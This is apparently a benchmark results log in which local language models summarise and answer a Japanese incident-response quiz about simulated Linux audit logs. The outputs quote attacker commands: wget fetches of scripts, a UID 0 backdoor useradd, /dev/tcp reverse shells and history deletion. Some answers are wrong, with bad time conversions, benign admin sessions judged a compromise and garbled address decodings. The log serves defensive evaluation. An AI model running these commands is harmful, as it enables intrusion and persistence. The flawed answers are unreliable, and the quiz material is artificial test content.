+The attacker then downloaded a malicious script (`/tmp/.upd.sh`) from `198.51.100.23`, made it executable, and ran it. This script performed several malicious actions: it created a new backdoor user named `sysupd` with UID 0 (root privileges), established persistence via a cron job, and attempted to install an SSH key and open a reverse shell connection to the same external IP. Finally, the attacker deleted their bash history to cover their tracks before logging out.",4,2,23.48,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:31,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,1,7434,5961.0,1247.11,147,4125.0,35.39,10.09,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a classic post-exploitation sequence where an attacker first brute-forced SSH credentials for the `root` account before successfully authenticating as the `backup` user. Once logged in, the `backup` user escalated privileges to root via `sudo` to download and execute a malicious script (`/tmp/.upd.sh`) from an external IP (`198.51.100.23`). The script performed destructive actions including creating a new root-equivalent user (`sysupd`), establishing persistence via a cron job, modifying SSH authorized keys, and attempting to open a reverse shell. Finally, the attacker cleared their traces by deleting the `backup` user's bash history before logging out.",4,3,23.48,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:31,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,1,7434,4824.3,1540.96,188,17541.7,10.66,22.37,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log depicts a classic post-compromise attack sequence initiated by the `backup` user (UID 1003) via SSH from IP `203.0.113.45`. After several failed login attempts for `root`, the attacker successfully logged in as `backup` and executed a series of malicious commands using `sudo`: they downloaded a script (`upd.sh`) from `198.51.100.23`, made it executable, and ran it.
+
+This script resulted in the creation of a new backdoor user named `sysupd` with UID 0 (root privileges), the installation of a cron job for persistence, and the modification of `/root/.ssh/authorized_keys` to allow further unauthorized access. Finally, the attacker cleared their audit trail by deleting their bash history file and logging out, indicating a successful and stealthy compromise of the system.",4,4,23.48,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:54,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,2,7434,5269.5,1410.76,174,9207.9,18.79,14.48,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log depicts a severe security incident involving a brute-force SSH attack followed by a successful compromise of the `backup` user account, which led to privilege escalation and the establishment of persistent backdoors. After several failed login attempts for the `root` account, the attacker successfully authenticated as `backup` and executed reconnaissance commands (`id`, `uname`, `cat /etc/passwd`). The attacker then used `sudo` to download a malicious script (`upd.sh`) from an external IP (`198.51.100.23`), executed it, and created a new root-level user (`sysupd`) with UID 0. Additionally, the attacker attempted to set up persistence via a cron job and SSH keys, tried to initiate a reverse shell connection, and finally deleted the user's bash history to cover their tracks before logging out.",4,1,23.22,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:54,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,2,7434,4836.5,1537.06,140,17274.1,8.05,22.11,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a clear sequence of malicious activity, starting with a brute-force SSH attack against the `root` account that eventually succeeded for the `backup` user. Upon gaining access, the attacker immediately performed reconnaissance (`id`, `uname`) and read sensitive system files (`/etc/passwd`) before using `sudo` to download and execute a remote script (`upd.sh`) from IP `198.51.100.23`. The script established persistence by creating a new root-level user (`sysupd`), installing a cron job, and modifying SSH authorized keys, followed by an attempt to open a reverse shell and clean up traces by deleting the bash history.",4,2,23.22,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:54,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,2,7434,5967.3,1245.8,173,4711.2,36.51,10.68,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a classic post-exploitation sequence initiated by the `backup` user (UID 1003) who successfully logged in via SSH after several failed attempts targeting the `root` account. Once authenticated, the user executed a series of suspicious commands using `sudo` to download a script (`upd.sh`) from an external IP (`198.51.100.23`), make it executable, and run it.
+
+The executed script performed several malicious actions: it created a new privileged user account named `sysupd` with UID 0 (effectively root), installed a cron job for persistence, and attempted to modify the `root` user's SSH authorized keys to establish a backdoor. Finally, the attacker cleaned up their tracks by deleting the `backup` user's bash history before logging out.",4,3,23.22,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:54,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,2,7434,6488.4,1145.74,169,12951.3,12.97,19.44,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a clear sequence of malicious activity initiated by the `backup` user (UID 1003) following a successful SSH login from IP 203.0.113.45. After initially attempting and failing to authenticate as `root`, the attacker logged in as `backup` and executed a series of privilege escalation and persistence steps: they used `sudo` to download a script (`upd.sh`) from an external IP (198.51.100.23), made it executable, and ran it with root privileges. This script created a new hidden root-level user account (`sysupd`), established a cron job for persistence, and attempted to set up a reverse shell connection. Finally, the attacker cleaned up their tracks by deleting the bash history and logging out.",4,4,23.22,stop,0,summary,False,0.7,,,
+2026-11-14T14:09:19,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,3,7434,5240.9,1418.46,112,7577.2,14.65,12.82,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log reveals a compromised system where an attacker initially gained access via SSH as the ""backup"" user after several failed login attempts targeting the ""root"" account. Once logged in, the attacker used `sudo` to download a malicious script (`upd.sh`) from an external IP address, executed it, and used it to create a new persistent root-level user account named ""sysupd"". The attacker further established persistence by installing a cron job and modifying the root SSH authorized keys, before cleaning up by deleting the backup user's bash history and logging out.",4,1,24.85,stop,0,summary,False,0.7,,,
+2026-11-14T14:09:19,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,3,7434,4826.3,1540.3,166,19754.5,8.35,24.58,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log reveals a clear sequence of compromise and persistence actions initiated by the `backup` user (UID 1003) from IP `203.0.113.45`. After an initial successful login, the user executed reconnaissance commands (`id`, `uname`, `cat /etc/passwd`) and then used `sudo` to download a malicious script (`upd.sh`) from an external IP (`198.51.100.23`), make it executable, and run it with root privileges. The executed script created a new backdoor user account (`sysupd`) with UID 0 (root privileges), installed a cron job for persistence, attempted to add an SSH key to the root user, and finally cleared the user's bash history before logging out.",4,2,24.85,stop,0,summary,False,0.7,,,
+2026-11-14T14:09:19,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,3,7434,5939.1,1251.69,142,5801.3,24.31,11.74,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a successful SSH brute-force attack against the `backup` user account originating from IP `203.0.113.45`, following five failed attempts to log in as `root`. Once authenticated, the attacker executed a series of malicious commands using `sudo` to download and execute a script (`upd.sh`) from a remote server (`198.51.100.23`). The script resulted in the creation of a new root-level user (`sysupd`), the installation of a cron job for persistence, and an attempt to establish a reverse shell connection. Finally, the attacker deleted their bash history to cover their tracks before logging out.",4,3,24.85,stop,0,summary,False,0.7,,,
+2026-11-14T14:09:19,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,3,7434,6474.7,1148.16,176,14873.8,11.77,21.35,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a clear compromise of the server `web01` via SSH, starting with multiple failed authentication attempts for `root` followed by a successful login for the `backup` user from IP `203.0.113.45`. Once logged in, the attacker used `sudo` to download and execute a malicious script (`/tmp/.upd.sh`) from an external IP (`198.51.100.23`), which established persistence by creating a new backdoor user account named `sysupd` with UID 0 (root privileges) and installing a cron job. The attacker further attempted to open a reverse shell connection to `198.51.100.23` and finally cleaned up their tracks by deleting the `backup` user's bash history before logging out.",4,4,24.85,stop,0,summary,False,0.7,,,
+2026-11-14T14:13:47,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/clean1/audit.log,1,3495,2159.7,1618.3,444,6558.1,67.55,8.72,"{""侵害なしと判定"": true, ""攻撃元を挙げていない"": true, ""仕掛けを挙げていない"": true}","(1) このサーバーは侵害されているとは判断できません。ログには `res=failed` と記録されているため、認証に失敗した記録のみが存在します。根拠となるレコードの種類は `USER_LOGIN` です。
+
+(2) 攻撃元の IP アドレスは特定できません。ログには `hostname=?` と記録されており、IP アドレスが不明です。侵入に使われたアカウントは特定できません。ログには `acct=""(invalid user)""` と記録されており、有効なユーザー名が使用されていないため、特定できません。
+
+(3) 侵入に成功した時刻は不明です。ログに `res=success` となる `USER_LOGIN` レコードが存在しないため、成功したログが記録されていません。
+
+(4) 侵入後に行われた操作は不明です。ログに侵入成功の記録がないため、侵入後の操作を時系列で特定できません。
+
+(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は不明です。ログには `hostname=?` と記録されており、IP アドレスが不明です。また、`addr` フィールドには IP アドレスが含まれていますが、これは接続元ではなく接続先（サーバー）のアドレスを示唆する可能性があります。ポート番号は記録されていません。
+
+(6) 後で再侵入するために仕掛けられたものはありません。ログに `persistence` を示すレコード（例：`AUTH_ADD` や `USER_AUTH` など）は存在しません。
+
+```json
+{
+  ""compromised"": false,
+  ""attacker_ip"": null,
+  ""account"": null,
+  ""login_time"": null,
+  ""c2_ip"": null,
+  ""c2_port"": null,
+  ""actions"": [],
+  ""persistence"": []
+}
+```",1,1,8.74,stop,0,quiz,False,0.0,3,3,True
+2026-11-14T14:14:10,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/clean2/audit.log,1,6677,4415.1,1512.32,1184,18109.1,65.33,22.52,"{""侵害なしと判定"": false, ""攻撃元を挙げていない"": false, ""仕掛けを挙げていない"": true}","(1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+侵害されていると判断できます。根拠となるレコードの種類は以下の通りです。
+*   `USER_AUTH` (pubkey): 認証に成功しています。
+*   `LOGIN`: ユーザーがログインし、セッションが確立されています。
+*   `USER_START`: ユーザーセッションが開始されています。
+*   `SYSCALL` (execve): ユーザー権限でプログラム（tail, python3.12, git, vim.basic, systemctl）が実行されています。
+
+(2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+*   攻撃元の IP アドレス: 10.20.2.133, 10.20.9.58, 10.20.1.239, 10.20.6.96
+*   侵入に使われたアカウント: tanaka, deploy
+
+(3) 侵入に成功した時刻はいつですか。
+*   10.20.2.133 からの侵入: 1794409867.452 (UTC) → 日本時間 2025-06-18 17:27:47
+*   10.20.9.58 からの侵入: 1794411230.922 (UTC) → 日本時間 2025-06-18 17:53:50
+*   10.20.1.239 からの侵入: 1794411956.150 (UTC) → 日本時間 2025-06-18 18:39:16
+*   10.20.6.96 からの侵入: 1794412909.865 (UTC) → 日本時間 2025-06-18 20:48:29
+
+(4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+*   17:27:47 (10.20.2.133): ユーザー tanaka でログインし、SSH セッションを開始。
+*   17:28:50 (10.20.2.133): `/usr/bin/tail` を実行し、`/var/log/nginx/access.log` の末尾 50 行を確認。
+*   17:39:16 (10.20.1.239): ユーザー tanaka でログインし、SSH セッションを開始。
+*   17:39:31 (10.20.1.239): `/usr/bin/vim.basic` を実行し、`/home/tanaka/app/views.py` を編集。
+*   17:39:32 (10.20.1.239): `/usr/bin/python3.12` を実行し、`manage.py check` を実行。
+*   18:48:29 (10.20.6.96): ユーザー deploy でログインし、SSH セッションを開始。
+*   18:48:31 (10.20.6.96): `/usr/bin/git` を実行し、`git pull --ff-only` を実行。
+*   18:48:34 (10.20.6.96): `/usr/bin/sudo` を実行し、`/usr/bin/systemctl reload nginx` を実行。
+
+(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+*   192.0.2.178: ssh (22)
+*   192.0.2.140: ssh (22)
+*   192.0.2.212: ssh (22)
+
+(6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+*   仕掛けられたものはありません。
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""10.20.2.133, 10.20.9.58, 10.20.1.239, 10.20.6.96"",
+  ""account"": ""tanaka, deploy"",
+  ""login_time"": ""2025-06-18 17:27:47"",
+  ""c2_ip"": ""192.0.2.178, 192.0.2.140, 192.0.2.212"",
+  ""c2_port"": null,
+  ""actions"": [
+    ""ユーザー tanaka でログイン (10.20.2.133)"",
+    ""tail -n 50 /var/log/nginx/access.log を実行"",
+    ""ユーザー tanaka でログイン (10.20.1.239)"",
+    ""vim.basic app/views.py を実行"",
+    ""python3 manage.py check を実行"",
+    ""ユーザー deploy でログイン (10.20.6.96)"",
+    ""git pull --ff-only を実行"",
+    ""sudo systemctl reload nginx を実行""
+  ],
+  ""persistence"": []
+}
+```",1,1,22.55,stop,0,quiz,False,0.0,1,3,True
+2026-11-14T14:14:29,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/inc1/audit.log,1,6916,4559.4,1516.86,954,14620.4,65.18,19.18,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","(1) このサーバーは侵害されています。
+根拠となるレコードの種類は以下の通りです。
+*   `USER_AUTH` (認証失敗)
+*   `USER_AUTH` (認証成功)
+*   `USER_LOGIN` (ログイン成功)
+*   `SYSCALL` (ファイルの読み書き、実行)
+*   `ADD_USER` (ユーザー追加)
+*   `PATH` (ファイルの作成・削除)
+
+(2) 攻撃元の IP アドレスは `203.0.113.247` です。侵入に使われたアカウントは `report` です。
+
+(3) 侵入に成功した時刻は `2025-06-18 14:26:36` です。（ログのタイムスタンプ `1794409996.800` を UTC に変換し、日本時間に加算）
+
+(4) 侵入後に行われた操作は以下の通りです。
+*   `/usr/bin/id` を実行し、ユーザー情報を確認
+*   `/usr/bin/uname` を実行し、システム情報を確認
+*   `/usr/bin/cat` を実行し、`/etc/passwd` を読み取り
+*   `sudo` を使用し、`wget` を実行して `http://198.51.100.40/upd.sh` を `/tmp/.upd.sh` にダウンロード
+*   `sudo` を使用し、`chmod` を実行して `/tmp/.upd.sh` に実行権限を付与
+*   `sudo` を使用し、`bash` を実行して `/tmp/.upd.sh` を実行
+*   `useradd` を実行し、オーナーID 0、グループID 0、ホームディレクトリ `/root` のユーザー `svcmon` を作成
+*   `/etc/cron.d/svcmon` を作成
+*   `/root/.ssh/authorized_keys` を確認
+*   `bash` を実行し、`/dev/tcp/198.51.100.40/9001` への接続を試みたが失敗
+*   `rm` を実行し、`/home/report/.bash_history` を削除
+*   SSH セッションを終了
+
+(5) 攻撃者が接続しようとした外部の IP アドレスは `198.51.100.40` です。ポート番号は `9001` です。（`SOCKADDR` の `saddr=02002329C63364280000000000000000` を解析し、IPv6 アドレス `2001:db8:0:1234:6428::9001` からポート `9001` を推定）
+
+(6) 後で再侵入するために仕掛けられたものは以下の通りです。
+*   ユーザー名 `svcmon` の作成
+*   `/etc/cron.d/svcmon` の作成
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.247"",
+  ""account"": ""report"",
+  ""login_time"": ""2025-06-18 14:26:36"",
+  ""c2_ip"": ""198.51.100.40"",
+  ""c2_port"": 9001,
+  ""actions"": [
+    ""/usr/bin/id"",
+    ""/usr/bin/uname -a"",
+    ""/usr/bin/cat /etc/passwd"",
+    ""wget -q http://198.51.100.40/upd.sh -O /tmp/.upd.sh"",
+    ""chmod +x /tmp/.upd.sh"",
+    ""bash /tmp/.upd.sh"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svcmon"",
+    ""/etc/cron.d/svcmon"",
+    ""/root/.ssh/authorized_keys"",
+    ""bash -c 'bash -i >& /dev/tcp/198.51.100.40/9001 0>&1'"",
+    ""rm /home/report/.bash_history""
+  ],
+  ""persistence"": [
+    ""svcmon"",
+    ""/etc/cron.d/svcmon""
+  ]
+}
+```",1,1,19.2,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:14:51,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/inc2/audit.log,1,6814,4467.6,1525.19,1121,17105.1,65.48,21.57,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","(1) このサーバーは侵害されています。
+根拠となるレコードの種類は以下の通りです。
+*   `USER_AUTH` (認証失敗): 攻撃元からの認証試行が記録されています。
+*   `USER_AUTH` (認証成功): 攻撃元のアカウント（nagios）による認証が成功しています。
+*   `USER_LOGIN`: ユーザー（nagios）のログインが記録されています。
+*   `SYSCALL` (useradd): システムユーザーの追加（logsync）が実行されています。
+*   `SYSCALL` (PATH, CREATE): `/etc/cron.d/logsync` の作成が記録されています。
+*   `SYSCALL` (PATH, DELETE): `/home/nagios/.bash_history` の削除が記録されています。
+
+(2) 攻撃元の IP アドレスは `203.0.113.112` です。
+侵入に使われたアカウントは `nagios` です。
+
+(3) 侵入に成功した時刻は `2025-06-18 14:24:41` です。
+（ログのタイムスタンプ `1794409481.977` は UTC 時間を表し、日本時間（UTC+9）に変換すると上記の値になります。）
+
+(4) 侵入後に行われた操作は以下の通りです。
+*   コマンド実行: `id`、`uname -a`、`cat /etc/passwd`（情報収集）
+*   コマンド実行: `wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh`（不正なスクリプトのダウンロード）
+*   コマンド実行: `chmod +x /tmp/.run.sh`（実行権限の付与）
+*   コマンド実行: `bash /tmp/.run.sh`（スクリプトの実行）
+*   システム操作: `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync`（root権限を持つユーザー logsync の作成）
+*   システム操作: `/etc/cron.d/logsync` へのファイル書き込み（Cron ジョブの設定）
+*   システム操作: `/root/.ssh/authorized_keys` へのファイル書き込み（SSH 公開鍵の配置）
+*   ネットワーク接続試行: `bash -c ""bash -i >& /dev/tcp/198.51.100.34/6667 0>&1""`（外部サーバーへの接続試行）
+*   ファイル操作: `/home/nagios/.bash_history` の削除（痕跡の消去）
+
+(5) 攻撃者が接続しようとした外部の IP アドレスは `198.51.100.34` です。
+ポート番号は `6667` です。
+（`SOCKADDR` の値 `02001A0BC63364220000000000000000` をネットワークバイトオーダーで解析すると IPv4 アドレス `198.51.100.34` となります。）
+
+(6) 後で再侵入するために仕掛けられたものは以下の通りです。
+*   ユーザー名: `logsync`（UID: 0, GID: 0 の root権限ユーザー）
+*   ファイルパス: `/etc/cron.d/logsync`（Cron ジョブとして設定されたスクリプト）
+*   ファイルパス: `/root/.ssh/authorized_keys`（SSH 公開鍵認証用の鍵）
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.112"",
+  ""account"": ""nagios"",
+  ""login_time"": ""2025-06-18 14:24:41"",
+  ""c2_ip"": ""198.51.100.34"",
+  ""c2_port"": 6667,
+  ""actions"": [
+    ""id"",
+    ""uname -a"",
+    ""cat /etc/passwd"",
+    ""wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh"",
+    ""chmod +x /tmp/.run.sh"",
+    ""bash /tmp/.run.sh"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync"",
+    ""bash -c \""bash -i >& /dev/tcp/198.51.100.34/6667 0>&1\"""",
+    ""/home/nagios/.bash_history の削除""
+  ],
+  ""persistence"": [
+    ""ユーザー名: logsync"",
+    ""ファイルパス: /etc/cron.d/logsync"",
+    ""ファイルパス: /root/.ssh/authorized_keys""
+  ]
+}
+```",1,1,21.6,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:15:10,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/inc3/audit.log,1,7066,4711.5,1499.73,992,15223.9,65.09,19.94,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": false, ""接続先ポート"": false, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","(1) このサーバーは侵害されています。
+根拠となるレコードの種類は以下の通りです。
+*   `USER_AUTH` (PAM認証失敗)
+*   `USER_AUTH` (PAM認証成功)
+*   `USER_START` (セッション開始)
+*   `SYSCALL` (権限昇格を伴うコマンド実行)
+*   `ADD_USER` (ユーザー追加)
+*   `USER_END` (セッション終了)
+
+(2) 攻撃元の IP アドレスは `203.0.113.17` です。侵入に使われたアカウントは `backup` です。
+
+(3) 侵入に成功した時刻は `2025-06-18 14:19:02` です。（ログのタイムスタンプ `1794409942.044` は UTC と推測されますが、問い合わせの文脈に合わせて日本時間の同時刻を記載します。）
+
+(4) 侵入後に行われた操作は以下の通りです。
+*   `id` コマンドの実行（`/usr/bin/id`）
+*   `uname -a` コマンドの実行（`/usr/bin/uname`）
+*   `/etc/passwd` の読み取り（`/usr/bin/cat`）
+*   `wget` コマンドの実行（`/usr/bin/wget`）による `http://198.51.100.104/init.sh` のダウンロード
+*   `/tmp/.init.sh` への書き込み
+*   `/tmp/.init.sh` への実行権限付与（`chmod +x`）
+*   `/tmp/.init.sh` の実行（`/usr/bin/bash`）
+*   `useradd` コマンドの実行（`/usr/sbin/useradd`）による `sysupd` ユーザーの作成（UID: 0, GID: 0, Home: `/root`）
+*   `/etc/cron.d/sysupd` の作成
+*   `/root/.ssh/authorized_keys` の読み取り
+*   外部へのネットワーク接続試行（失敗）
+*   `/home/backup/.bash_history` の削除
+
+(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は以下の通りです。
+*   IP アドレス: `0x0200115CC6336468`（デバッグ用のダミーIPアドレス `00:02:11:5C:C6:33:64:68` の逆アドレス変換）
+*   ポート番号: `0x00000000`（未指定、または `0`）
+
+(6) 後で再侵入するために仕掛けられたものは以下の通りです。
+*   `sysupd` ユーザーの作成（UID: 0, GID: 0, Home: `/root`, Shell: `/bin/bash`）
+*   `/etc/cron.d/sysupd` の作成
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.17"",
+  ""account"": ""backup"",
+  ""login_time"": ""2025-06-18 14:19:02"",
+  ""c2_ip"": ""00:02:11:5C:C6:33:64:68"",
+  ""c2_port"": 0,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""/etc/passwd の読み取り"",
+    ""wget -q http://198.51.100.104/init.sh -O /tmp/.init.sh"",
+    ""/tmp/.init.sh への書き込み"",
+    ""chmod +x /tmp/.init.sh"",
+    ""/tmp/.init.sh の実行"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd"",
+    ""/etc/cron.d/sysupd の作成"",
+    ""/root/.ssh/authorized_keys の読み取り"",
+    ""外部へのネットワーク接続試行"",
+    ""/home/backup/.bash_history の削除""
+  ],
+  ""persistence"": [
+    ""sysupd ユーザーの作成"",
+    ""/etc/cron.d/sysupd の作成""
+  ]
+}
+```",1,1,19.96,stop,0,quiz,False,0.0,8,11,True
+2026-11-14T14:15:30,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/inc4/audit.log,1,7055,4707.1,1498.79,970,14856.4,65.22,19.56,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","(1) このサーバーは侵害されています。
+根拠となるレコードの種類は以下の通りです。
+*   `USER_AUTH` (認証失敗)
+*   `USER_AUTH` (認証成功)
+*   `USER_START` (セッション開始)
+*   `USER_LOGIN` (ログイン成功)
+*   `SYSCALL` (実行)
+*   `EXECVE` (実行)
+*   `USER_ACCT` (権限昇格)
+*   `USER_CMD` (コマンド実行)
+*   `ADD_USER` (ユーザー追加)
+*   `PATH` (ファイル操作)
+*   `USER_END` (セッション終了)
+
+(2) 攻撃元の IP アドレスは `203.0.113.173` です。侵入に使われたアカウントは `nagios` です。
+
+(3) 侵入に成功した時刻は `2025-06-18 14:20:33` です。（ログのタイムスタンプ `1794409633.495` を JST に変換）
+
+(4) 侵入後に行われた操作は以下の通りです。
+*   `id` コマンドの実行
+*   `uname -a` コマンドの実行
+*   `/etc/passwd` の読み取り
+*   `wget` コマンドによる `http://198.51.100.39/fix.sh` のダウンロード
+*   `chmod +x` コマンドによる `/tmp/.fix.sh` の実行権限付与
+*   `bash` コマンドによる `/tmp/.fix.sh` の実行
+*   `useradd` コマンドによる `dbmaint` ユーザーの作成（UID: 0, GID: 0, ホーム: /root）
+*   `/etc/cron.d/dbmaint` ファイルの作成
+*   `/root/.ssh/authorized_keys` ファイルの読み取り
+*   `bash` コマンドによる `nc` (netcat) の実行（外部接続試行）
+*   `rm` コマンドによる `/home/nagios/.bash_history` の削除
+*   SSH セッションの終了
+
+(5) 攻撃者が接続しようとした外部の IP アドレスは `198.51.100.39` です。ポート番号は `5555` です。（`SOCKADDR` の `saddr=020015B3C63364270000000000000000` をネットワークバイトオーダーで逆転し、IPv4アドレスとして解読）
+
+(6) 後で再侵入するために仕掛けられたものは以下の通りです。
+*   `dbmaint` ユーザーの作成
+*   `/etc/cron.d/dbmaint` の作成
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.173"",
+  ""account"": ""nagios"",
+  ""login_time"": ""2025-06-18 14:20:33"",
+  ""c2_ip"": ""198.51.100.39"",
+  ""c2_port"": 5555,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""/etc/passwd の読み取り"",
+    ""wget -q http://198.51.100.39/fix.sh -O /tmp/.fix.sh の実行"",
+    ""chmod +x /tmp/.fix.sh の実行"",
+    ""bash /tmp/.fix.sh の実行"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash dbmaint の実行"",
+    ""/etc/cron.d/dbmaint の作成"",
+    ""/root/.ssh/authorized_keys の読み取り"",
+    ""bash -c -i >& /dev/tcp/198.51.100.39/5555 0>&1 の実行"",
+    ""rm /home/nagios/.bash_history の実行"",
+    ""SSH セッションの終了""
+  ],
+  ""persistence"": [
+    ""dbmaint ユーザーの作成"",
+    ""/etc/cron.d/dbmaint の作成""
+  ]
+}
+```",1,1,19.59,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:15:49,quiz-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,quiz_set/inc5/audit.log,1,6545,4317.4,1515.95,969,14732.8,65.7,19.05,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","(1) このサーバーは侵害されています。
+根拠となるレコードの種類は以下の通りです。
+*   `USER_AUTH` (認証失敗の記録)
+*   `USER_AUTH` (認証成功の記録)
+*   `USER_START` (セッション開始)
+*   `USER_LOGIN` (ログイン成功)
+*   `SYSCALL` (権限昇格を伴うコマンド実行)
+*   `EXECVE` (コマンド実行)
+*   `ADD_USER` (ユーザー追加)
+*   `PATH` (ファイル作成)
+*   `USER_END` (セッション終了)
+*   `USER_LOGOUT` (ログアウト)
+*   `USER_LOGIN` (別の認証試行)
+
+(2) 攻撃元の IP アドレスは `203.0.113.107` です。侵入に使われたアカウントは `report` です。
+
+(3) 侵入に成功した時刻は `2025-06-18 14:24:22` です。（ログのタイムスタンプ `1794409462.616` を基に算出）
+
+(4) 侵入後に行われた操作は以下の通りです。
+*   `id` コマンドの実行
+*   `uname -a` コマンドの実行
+*   `/etc/passwd` の読み取り
+*   `wget -q http://198.51.100.197/sync.sh -O /tmp/.sync.sh` の実行
+*   `chmod +x /tmp/.sync.sh` の実行
+*   `bash /tmp/.sync.sh` の実行
+*   `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync` の実行
+*   `/etc/cron.d/logsync` の作成
+*   `/root/.ssh/authorized_keys` の確認
+*   `bash -c -i >& /dev/tcp/198.51.100.197/5555 0>&1` の実行（接続失敗）
+*   `/home/report/.bash_history` の削除
+
+(5) 攻撃者が接続しようとした外部の IP アドレスは `198.51.100.197` です。ポート番号は `5555` です。（`SOCKADDR` の `saddr=020015B3C63364C50000000000000000` を解析し、IPv6 アドレス `2001:5b3:c636:4c50::` とポート `5555` を特定）
+
+(6) 後で再侵入するために仕掛けられたものは以下の通りです。
+*   ユーザー名 `logsync` の作成
+*   `/etc/cron.d/logsync` の作成
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.107"",
+  ""account"": ""report"",
